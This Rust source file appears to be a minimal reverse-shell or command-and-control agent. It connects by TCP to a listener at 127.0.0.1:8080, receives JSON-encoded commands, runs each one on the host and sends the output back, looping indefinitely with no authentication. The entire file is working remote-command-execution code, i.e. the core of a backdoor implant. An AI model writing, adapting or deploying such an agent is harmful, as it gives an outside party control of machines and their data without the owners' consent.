use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use tokio::process::Command;
use std::process::Stdio;
use serde::{Deserialize, Serialize};
use serde_json::Result;


// The structs that will be serialized/deserialized as json
// as the communication protocol
#[derive(Serialize, Deserialize)]
struct Input {
    command: String
}

#[derive(Serialize, Deserialize)]
struct Output{
    output: String
}


#[tokio::main]
async fn main() {
    // Buff for socket
    let mut buff = [0;1024];
    // Tokio create connection
    let mut stream = TcpStream::connect("127.0.0.1:8080").await.unwrap();

    // Keep accepting data and do stuff with is
    loop{
    let n = stream.read(&mut buff).await.unwrap();
    
    // Convert json to struct
    let my_data: Input = serde_json::from_str(std::str::from_utf8( &mut buff[..n]).unwrap()).unwrap();
    //let command: Vec<&str> = my_data.command.split(" ").collect();


    // Currently only have option to run command so run it
    let command_output = Command::new(my_data.command).output().await.unwrap();
    

    // turn command output into json
    let output_data: Output = Output{
        output: std::str::from_utf8(&command_output.stdout).unwrap().to_string()
    };

    //Send json back
    stream.write(serde_json::to_string(&output_data).unwrap().as_bytes()).await.unwrap();
    }
}